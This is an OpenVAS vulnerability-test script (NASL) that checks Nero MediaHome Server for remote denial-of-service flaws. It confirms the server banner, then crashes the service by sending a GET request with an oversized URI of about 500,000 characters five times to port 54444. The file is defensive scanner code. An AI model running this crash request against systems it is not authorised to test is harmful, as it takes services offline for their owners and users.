###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_nero_mediahome_server_mult_dos_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# Nero MediaHome Server Multiple Remote DoS Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to cause the application
  to crash, creating a denial-of-service condition.
  Impact Level: Application";
tag_summary = "Nero MediaHome Server is prone to multiple denial of service vulnerabilities.";
tag_vuldetect = "This test works by sending a big size request to the target service
  listening on port 54444/TCP and checking that  the target service is dead.";
tag_solution = "No solution or patch is available as of 10th January, 2013. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.nero.com/ena/products/nero-mediahome/";
tag_affected = "Nero MediaHome Server version 4.5.8.100 and prior";
tag_insight = "Multiple flaws are due to improper handling of the URI length, HTTP OPTIONS
  method length, HTTP HEAD request, HTTP REFERER and HTTP HOST header within
  the 'NMMediaServer.dll' in dynamic-link library which allows attackers to
  cause denial of service condition by sending a specially crafted packet
  to port 54444/TCP.";

if(description)
{
  script_id(803150);
  script_version("$Revision: 11 $");
  script_cve_id("CVE-2012-5876", "CVE-2012-5877");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-01-10 14:19:03 +0530 (Thu, 10 Jan 2013)");
  script_name("Nero MediaHome Server Multiple Remote DoS Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Detection:
  " + tag_vuldetect + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0){
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "vuldetect" , value : tag_vuldetect);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "impact" , value : tag_impact);
  }

  script_xref(name : "URL" , value : "http://inter5.org/archives/226548");
  script_xref(name : "URL" , value : "http://seclists.org/bugtraq/2013/Jan/36");
  script_xref(name : "URL" , value : "https://www.htbridge.com/advisory/HTB23130");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/525249/30/0/threaded");

  script_description(desc);
  script_summary("Check if Nero MediaHome Server is vulnerable to denial of service");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_require_ports("Services/www", 54444);
  exit(0);
}


include("http_func.inc");

## Variable Initialization
req = "";
res = "";
port = 0;
banner = "";

## Get HTTP Port
port = get_http_port(default:54444);
if(!port){
  exit(0);
}

## Confirm the application before trying exploit
banner = get_http_banner(port: port);
if(!banner || "Nero-MediaHome/" >!< banner){
  exit(0);
}

## Construct attack request
req = http_get(item:string("/A",crap(500000)), port:port);

for(i=0; i<5; i++)
{
 ## Send crafted request
 res = http_send_recv(port:port, data:req);
}

sleep(2);

## Confirm HTTP Server is dead
if(http_is_dead(port:port)){
  security_hole(port);
}
